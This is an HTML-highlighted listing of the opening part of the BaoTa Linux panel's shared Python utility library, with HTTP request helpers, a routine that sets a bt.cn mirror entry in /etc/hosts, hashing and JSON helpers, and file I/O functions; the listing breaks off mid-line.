class="line">2019</span><br><span class="line">2020</span><br><span class="line">2021</span><br><span class="line">2022</span><br><span class="line">2023</span><br><span class="line">2024</span><br><span class="line">2025</span><br><span class="line">2026</span><br><span class="line">2027</span><br><span class="line">2028</span><br><span class="line">2029</span><br><span class="line">2030</span><br><span class="line">2031</span><br><span class="line">2032</span><br><span class="line">2033</span><br><span class="line">2034</span><br><span class="line">2035</span><br><span class="line">2036</span><br><span class="line">2037</span><br><span class="line">2038</span><br><span class="line">2039</span><br><span class="line">2040</span><br><span class="line">2041</span><br><span class="line">2042</span><br><span class="line">2043</span><br><span class="line">2044</span><br><span class="line">2045</span><br><span class="line">2046</span><br><span class="line">2047</span><br><span class="line">2048</span><br><span class="line">2049</span><br><span class="line">2050</span><br><span class="line">2051</span><br><span class="line">2052</span><br><span class="line">2053</span><br><span class="line">2054</span><br><span class="line">2055</span><br><span class="line">2056</span><br><span class="line">2057</span><br><span class="line">2058</span><br><span class="line">2059</span><br><span class="line">2060</span><br><span class="line">2061</span><br><span class="line">2062</span><br><span class="line">2063</span><br><span class="line">2064</span><br><span class="line">2065</span><br><span class="line">2066</span><br><span class="line">2067</span><br><span class="line">2068</span><br><span class="line">2069</span><br><span class="line">2070</span><br><span class="line">2071</span><br><span class="line">2072</span><br><span class="line">2073</span><br><span class="line">2074</span><br><span class="line">2075</span><br><span class="line">2076</span><br><span class="line">2077</span><br><span class="line">2078</span><br><span class="line">2079</span><br><span class="line">2080</span><br><span class="line">2081</span><br><span class="line">2082</span><br><span class="line">2083</span><br><span class="line">2084</span><br><span class="line">2085</span><br><span class="line">2086</span><br><span class="line">2087</span><br><span class="line">2088</span><br><span class="line">2089</span><br><span class="line">2090</span><br><span class="line">2091</span><br><span class="line">2092</span><br><span class="line">2093</span><br><span class="line">2094</span><br><span class="line">2095</span><br><span class="line">2096</span><br><span class="line">2097</span><br><span class="line">2098</span><br><span class="line">2099</span><br><span class="line">2100</span><br><span class="line">2101</span><br><span class="line">2102</span><br><span class="line">2103</span><br><span class="line">2104</span><br><span class="line">2105</span><br><span class="line">2106</span><br><span class="line">2107</span><br><span class="line">2108</span><br><span class="line">2109</span><br><span class="line">2110</span><br><span class="line">2111</span><br><span class="line">2112</span><br><span class="line">2113</span><br><span class="line">2114</span><br><span class="line">2115</span><br><span class="line">2116</span><br><span class="line">2117</span><br><span class="line">2118</span><br><span class="line">2119</span><br><span class="line">2120</span><br><span class="line">2121</span><br><span class="line">2122</span><br><span class="line">2123</span><br><span class="line">2124</span><br><span class="line">2125</span><br><span class="line">2126</span><br><span class="line">2127</span><br><span class="line">2128</span><br><span class="line">2129</span><br><span class="line">2130</span><br><span class="line">2131</span><br><span class="line">2132</span><br><span class="line">2133</span><br><span class="line">2134</span><br><span class="line">2135</span><br><span class="line">2136</span><br><span class="line">2137</span><br><span class="line">2138</span><br><span class="line">2139</span><br><span class="line">2140</span><br><span class="line">2141</span><br><span class="line">2142</span><br><span class="line">2143</span><br><span class="line">2144</span><br><span class="line">2145</span><br><span class="line">2146</span><br><span class="line">2147</span><br><span class="line">2148</span><br><span class="line">2149</span><br><span class="line">2150</span><br><span class="line">2151</span><br><span class="line">2152</span><br><span class="line">2153</span><br><span class="line">2154</span><br><span class="line">2155</span><br><span class="line">2156</span><br><span class="line">2157</span><br><span class="line">2158</span><br><span class="line">2159</span><br><span class="line">2160</span><br><span class="line">2161</span><br><span class="line">2162</span><br><span class="line">2163</span><br><span class="line">2164</span><br><span class="line">2165</span><br><span class="line">2166</span><br><span class="line">2167</span><br><span class="line">2168</span><br><span class="line">2169</span><br><span class="line">2170</span><br><span class="line">2171</span><br><span class="line">2172</span><br><span class="line">2173</span><br><span class="line">2174</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment"># +-------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># | 宝塔Linux面板</span></span><br><span class="line"><span class="comment"># +-------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># | Copyright (c) 2015-2099 宝塔软件(http://bt.cn) All rights reserved.</span></span><br><span class="line"><span class="comment"># +-------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># | Author: hwliang &lt;hwl@bt.cn&gt;</span></span><br><span class="line"><span class="comment"># +-------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------</span></span><br><span class="line"><span class="comment"># 宝塔公共库</span></span><br><span class="line"><span class="comment">#--------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json,os,sys,time,re,socket,importlib,binascii,base64,io</span><br><span class="line">_LAN_PUBLIC = <span class="literal">None</span></span><br><span class="line">_LAN_LOG = <span class="literal">None</span></span><br><span class="line">_LAN_TEMPLATE = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">    reload(sys)</span><br><span class="line">    sys.setdefaultencoding(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">from</span> importlib <span class="keyword">import</span> reload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">M</span>(<span class="params">table</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        @name 访问面板数据库</span></span><br><span class="line"><span class="string">        @author hwliang&lt;hwl@bt.cn&gt;</span></span><br><span class="line"><span class="string">        @table 被访问的表名(必需)</span></span><br><span class="line"><span class="string">        @return db.Sql object</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        ps: 默认访问data/default.db</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">import</span> db</span><br><span class="line">    <span class="keyword">with</span> db.Sql() <span class="keyword">as</span> sql:</span><br><span class="line">        <span class="comment">#sql = db.Sql()</span></span><br><span class="line">        <span class="keyword">return</span> sql.table(table)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">HttpGet</span>(<span class="params">url,timeout = <span class="number">6</span>,headers = &#123;&#125;</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        @name 发送GET请求</span></span><br><span class="line"><span class="string">        @author hwliang&lt;hwl@bt.cn&gt;</span></span><br><span class="line"><span class="string">        @url 被请求的URL地址(必需)</span></span><br><span class="line"><span class="string">        @timeout 超时时间默认60秒</span></span><br><span class="line"><span class="string">        @return string</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> is_local(): <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    home = <span class="string">&#x27;www.bt.cn&#x27;</span></span><br><span class="line">    host_home = <span class="string">&#x27;data/home_host.pl&#x27;</span></span><br><span class="line">    old_url = url</span><br><span class="line">    <span class="keyword">if</span> url.find(home) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(host_home):</span><br><span class="line">            headers[<span class="string">&#x27;host&#x27;</span>] = home</span><br><span class="line">            url = url.replace(home,readFile(host_home))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> http_requests</span><br><span class="line">    res = http_requests.get(url,timeout=timeout,headers = headers)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> old_url.find(home) != -<span class="number">1</span>: <span class="keyword">return</span> http_get_home(old_url,timeout,res.text)</span><br><span class="line">        <span class="keyword">if</span> headers: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        s_body = res.text</span><br><span class="line">        <span class="keyword">return</span> s_body</span><br><span class="line">    s_body = res.text</span><br><span class="line">    <span class="keyword">del</span> res</span><br><span class="line">    <span class="keyword">return</span> s_body</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">http_get_home</span>(<span class="params">url,timeout,ex</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        @name Get方式使用优选节点访问官网</span></span><br><span class="line"><span class="string">        @author hwliang&lt;hwl@bt.cn&gt;</span></span><br><span class="line"><span class="string">        @param url 当前官网URL地址</span></span><br><span class="line"><span class="string">        @param timeout 用于测试超时时间</span></span><br><span class="line"><span class="string">        @param ex 上一次错误的响应内容</span></span><br><span class="line"><span class="string">        @return string 响应内容</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        如果已经是优选节点，将直接返回ex</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        home = <span class="string">&#x27;www.bt.cn&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> url.find(home) == -<span class="number">1</span>: <span class="keyword">return</span> ex</span><br><span class="line">        hosts_file = <span class="string">&quot;config/hosts.json&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(hosts_file): <span class="keyword">return</span> ex</span><br><span class="line">        hosts = json.loads(readFile(hosts_file))</span><br><span class="line">        headers = &#123;<span class="string">&quot;host&quot;</span>:home&#125;</span><br><span class="line">        <span class="keyword">for</span> host <span class="keyword">in</span> hosts:</span><br><span class="line">            new_url = url.replace(home,host)</span><br><span class="line">            res = HttpGet(new_url,timeout,headers)</span><br><span class="line">            <span class="keyword">if</span> res:</span><br><span class="line">                writeFile(<span class="string">&quot;data/home_host.pl&quot;</span>,host)</span><br><span class="line">                set_home_host(host)</span><br><span class="line">                <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">return</span> ex</span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">return</span> ex</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_home_host</span>(<span class="params">host</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        @name 设置官网hosts</span></span><br><span class="line"><span class="string">        @author hwliang&lt;hwl@bt.cn&gt;</span></span><br><span class="line"><span class="string">        @param host IP地址</span></span><br><span class="line"><span class="string">        @return void</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    ExecShell(<span class="string">&#x27;sed -i &quot;/www.bt.cn/d&quot; /etc/hosts&#x27;</span>)</span><br><span class="line">    ExecShell(<span class="string">&quot;echo &#x27;&#x27; &gt;&gt; /etc/hosts&quot;</span>)</span><br><span class="line">    ExecShell(<span class="string">&quot;echo &#x27;%s www.bt.cn&#x27; &gt;&gt; /etc/hosts&quot;</span> % host)</span><br><span class="line">    ExecShell(<span class="string">&#x27;sed -i &quot;/^\s*$/d&quot; /etc/hosts&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">httpGet</span>(<span class="params">url,timeout=<span class="number">6</span></span>):</span><br><span class="line">    <span class="keyword">return</span> HttpGet(url,timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">HttpPost</span>(<span class="params">url,data,timeout = <span class="number">6</span>,headers = &#123;&#125;</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        发送POST请求</span></span><br><span class="line"><span class="string">        @url 被请求的URL地址(必需)</span></span><br><span class="line"><span class="string">        @data POST参数，可以是字符串或字典(必需)</span></span><br><span class="line"><span class="string">        @timeout 超时时间默认60秒</span></span><br><span class="line"><span class="string">        return string</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> is_local(): <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    home = <span class="string">&#x27;www.bt.cn&#x27;</span></span><br><span class="line">    host_home = <span class="string">&#x27;data/home_host.pl&#x27;</span></span><br><span class="line">    old_url = url</span><br><span class="line">    <span class="keyword">if</span> url.find(home) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(host_home):</span><br><span class="line">            headers[<span class="string">&#x27;host&#x27;</span>] = home</span><br><span class="line">            url = url.replace(home,readFile(host_home))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> http_requests</span><br><span class="line">    res = http_requests.post(url,data=data,timeout=timeout,headers = headers)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">0</span>:</span><br><span class="line">        <span class="comment">#WriteLog(&#x27;请求错误&#x27;,res.text)</span></span><br><span class="line">        <span class="keyword">if</span> old_url.find(home) != -<span class="number">1</span>: <span class="keyword">return</span> http_post_home(old_url,data,timeout,res.text)</span><br><span class="line">        <span class="keyword">if</span> headers: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        s_body = res.text</span><br><span class="line">        <span class="keyword">return</span> s_body</span><br><span class="line">    s_body = res.text</span><br><span class="line">    <span class="keyword">del</span> res</span><br><span class="line">    <span class="keyword">return</span> s_body</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">http_post_home</span>(<span class="params">url,data,timeout,ex</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        @name POST方式使用优选节点访问官网</span></span><br><span class="line"><span class="string">        @author hwliang&lt;hwl@bt.cn&gt;</span></span><br><span class="line"><span class="string">        @param url(string) 当前官网URL地址</span></span><br><span class="line"><span class="string">        @param data(dict) POST数据</span></span><br><span class="line"><span class="string">        @param timeout(int) 用于测试超时时间</span></span><br><span class="line"><span class="string">        @param ex(string) 上一次错误的响应内容</span></span><br><span class="line"><span class="string">        @return string 响应内容</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        如果已经是优选节点，将直接返回ex</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        home = <span class="string">&#x27;www.bt.cn&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> url.find(home) == -<span class="number">1</span>: <span class="keyword">return</span> ex</span><br><span class="line">        hosts_file = <span class="string">&quot;config/hosts.json&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(hosts_file): <span class="keyword">return</span> ex</span><br><span class="line">        hosts = json.loads(readFile(hosts_file))</span><br><span class="line">        headers = &#123;<span class="string">&quot;host&quot;</span>:home&#125;</span><br><span class="line">        <span class="keyword">for</span> host <span class="keyword">in</span> hosts:</span><br><span class="line">            new_url = url.replace(home,host)</span><br><span class="line">            res = HttpPost(new_url,data,timeout,headers)</span><br><span class="line">            <span class="keyword">if</span> res:</span><br><span class="line">                writeFile(<span class="string">&quot;data/home_host.pl&quot;</span>,host)</span><br><span class="line">                set_home_host(host)</span><br><span class="line">                <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">return</span> ex</span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">return</span> ex</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">httpPost</span>(<span class="params">url,data,timeout=<span class="number">6</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        @name 发送POST请求</span></span><br><span class="line"><span class="string">        @author hwliang&lt;hwl@bt.cn&gt;</span></span><br><span class="line"><span class="string">        @param url 被请求的URL地址(必需)</span></span><br><span class="line"><span class="string">        @param data POST参数，可以是字符串或字典(必需)</span></span><br><span class="line"><span class="string">        @param timeout 超时时间默认60秒</span></span><br><span class="line"><span class="string">        @return string</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> HttpPost(url,data,timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_home</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Md5</span>(<span class="params">strings</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        @name 生成MD5</span></span><br><span class="line"><span class="string">        @author hwliang&lt;hwl@bt.cn&gt;</span></span><br><span class="line"><span class="string">        @param strings 要被处理的字符串</span></span><br><span class="line"><span class="string">        @return string(32)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(strings) != <span class="built_in">bytes</span>:</span><br><span class="line">        strings = strings.encode()</span><br><span class="line">    <span class="keyword">import</span> hashlib</span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(strings)</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">strings</span>):</span><br><span class="line">    <span class="keyword">return</span> Md5(strings)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FileMd5</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        @name 生成文件的MD5</span></span><br><span class="line"><span class="string">        @author hwliang&lt;hwl@bt.cn&gt;</span></span><br><span class="line"><span class="string">        @param filename 文件名</span></span><br><span class="line"><span class="string">        @return string(32) or False</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(filename): <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">import</span> hashlib</span><br><span class="line">    my_hash = hashlib.md5()</span><br><span class="line">    f = <span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        b = f.read(<span class="number">8096</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> b :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        my_hash.update(b)</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> my_hash.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetRandomString</span>(<span class="params">length</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">       @name 取随机字符串</span></span><br><span class="line"><span class="string">       @author hwliang&lt;hwl@bt.cn&gt;</span></span><br><span class="line"><span class="string">       @param length 要获取的长度</span></span><br><span class="line"><span class="string">       @return string(length)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line">    strings = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    chars = <span class="string">&#x27;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789&#x27;</span></span><br><span class="line">    chrlen = <span class="built_in">len</span>(chars) - <span class="number">1</span></span><br><span class="line">    random = Random()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        strings += chars[random.randint(<span class="number">0</span>, chrlen)]</span><br><span class="line">    <span class="keyword">return</span> strings</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ReturnJson</span>(<span class="params">status,msg,args=(<span class="params"></span>)</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        @name 取通用Json返回</span></span><br><span class="line"><span class="string">        @author hwliang&lt;hwl@bt.cn&gt;</span></span><br><span class="line"><span class="string">        @param status  返回状态</span></span><br><span class="line"><span class="string">        @param msg  返回消息</span></span><br><span class="line"><span class="string">        @return string(json)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> GetJson(ReturnMsg(status,msg,args))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">returnJson</span>(<span class="params">status,msg,args=(<span class="params"></span>)</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        @name 取通用Json返回</span></span><br><span class="line"><span class="string">        @author hwliang&lt;hwl@bt.cn&gt;</span></span><br><span class="line"><span class="string">        @param status  返回状态</span></span><br><span class="line"><span class="string">        @param msg  返回消息</span></span><br><span class="line"><span class="string">        @return string(json)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> ReturnJson(status,msg,args)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ReturnMsg</span>(<span class="params">status,msg,args = (<span class="params"></span>)</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        @name 取通用dict返回</span></span><br><span class="line"><span class="string">        @author hwliang&lt;hwl@bt.cn&gt;</span></span><br><span class="line"><span class="string">        @param status  返回状态</span></span><br><span class="line"><span class="string">        @param msg  返回消息</span></span><br><span class="line"><span class="string">        @return dict  &#123;&quot;status&quot;:bool,&quot;msg&quot;:string&#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    log_message = json.loads(ReadFile(<span class="string">&#x27;BTPanel/static/language/&#x27;</span> + GetLanguage() + <span class="string">&#x27;/public.json&#x27;</span>))</span><br><span class="line">    keys = log_message.keys()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(msg) == <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">if</span> msg <span class="keyword">in</span> keys:</span><br><span class="line">            msg = log_message[msg]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(args)):</span><br><span class="line">                rep = <span class="string">&#x27;&#123;&#x27;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">                msg = msg.replace(rep,args[i])</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;status&#x27;</span>:status,<span class="string">&#x27;msg&#x27;</span>:msg&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">returnMsg</span>(<span class="params">status,msg,args = (<span class="params"></span>)</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        @name 取通用dict返回</span></span><br><span class="line"><span class="string">        @author hwliang&lt;hwl@bt.cn&gt;</span></span><br><span class="line"><span class="string">        @param status  返回状态</span></span><br><span class="line"><span class="string">        @param msg  返回消息</span></span><br><span class="line"><span class="string">        @return dict  &#123;&quot;status&quot;:bool,&quot;msg&quot;:string&#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> ReturnMsg(status,msg,args)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetFileMode</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        @name 取文件权限字符串</span></span><br><span class="line"><span class="string">        @author hwliang&lt;hwl@bt.cn&gt;</span></span><br><span class="line"><span class="string">        @param filename  文件全路径</span></span><br><span class="line"><span class="string">        @return string  如：644/777/755</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    stat = os.stat(filename)</span><br><span class="line">    accept = <span class="built_in">str</span>(<span class="built_in">oct</span>(stat.st_mode)[-<span class="number">3</span>:])</span><br><span class="line">    <span class="keyword">return</span> accept</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_mode_and_user</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;取文件或目录权限信息&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">import</span> pwd</span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path): <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    stat = os.stat(path)</span><br><span class="line">    data[<span class="string">&#x27;mode&#x27;</span>] = <span class="built_in">str</span>(<span class="built_in">oct</span>(stat.st_mode)[-<span class="number">3</span>:])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data[<span class="string">&#x27;user&#x27;</span>] = pwd.getpwuid(stat.st_uid).pw_name</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        data[<span class="string">&#x27;user&#x27;</span>] = <span class="built_in">str</span>(stat.st_uid)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetJson</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将对象转换为JSON</span></span><br><span class="line"><span class="string">    @data 被转换的对象(dict/list/str/int...)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">from</span> json <span class="keyword">import</span> dumps</span><br><span class="line">    <span class="keyword">if</span> data == <span class="built_in">bytes</span>: data = data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> dumps(data,ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> dumps(returnMsg(<span class="literal">False</span>,<span class="string">&quot;错误的响应: %s&quot;</span> % <span class="built_in">str</span>(data)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getJson</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> GetJson(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ReadFile</span>(<span class="params">filename,mode = <span class="string">&#x27;r&#x27;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    读取文件内容</span></span><br><span class="line"><span class="string">    @filename 文件名</span></span><br><span class="line"><span class="string">    return string(bin) 若文件不存在，则返回None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename): <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fp = <span class="built_in">open</span>(filename, mode)</span><br><span class="line">        f_body = fp.read()</span><br><span class="line">        fp.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] != <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                fp = <span class="built_in">open</span>(filename, mode,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                f_body = fp.read()</span><br><span class="line">                fp.close()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> ex2:</span><br><span class="line">                WriteLog(<span class="string">&#x27;打开文件&#x27;</span>,<span class="built_in">str</span>(ex2))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            WriteLog(<span class="string">&#x27;打开文件&#x27;</span>,<span class="built_in">str</span>(ex))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> f_body</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readFile</span>(<span class="params">filename,mode=<span class="string">&#x27;r&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> ReadFile(filename,mode)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">WriteFile</span>(<span class="params">filename,s_body,mode=<span class="string">&#x27;w+&#x27;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    写入文件内容</span></span><br><span class="line"><span class="string">    @filename 文件名</span></span><br><span class="line"><span class="string">    @s_body 欲写入的内容</span></span><br><span class="line"><span class="string">    return bool 若文件不存在则尝试自动创建</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fp = <span class="built_in">open</span>(filename, mode)</span><br><span class="line">        fp.write(s_body)</span><br><span class="line">        fp.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            fp = <span class="built_in">open</span>(filename, mode,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            fp.write(s_body)</span><br><span class="line">            fp.close()</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeFile</span>(<span class="params">filename,s_body,mode=<span class="string">&#x27;w+&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> WriteFile(filename,s_body,mode)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">WriteLog</span>(<span class="params"><span class="built_in">type</span>,logMsg,args=(<span class="params"></span>),not_web = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="comment">#写日志</span></span><br><span class="line">    <span class="comment">#try:</span></span><br><span class="line">    <span class="keyword">import</span> time,db,json</span><br><span class="line">    username = <span class="string">&#x27;system&#x27;</span></span><br><span class="line">    uid = <span 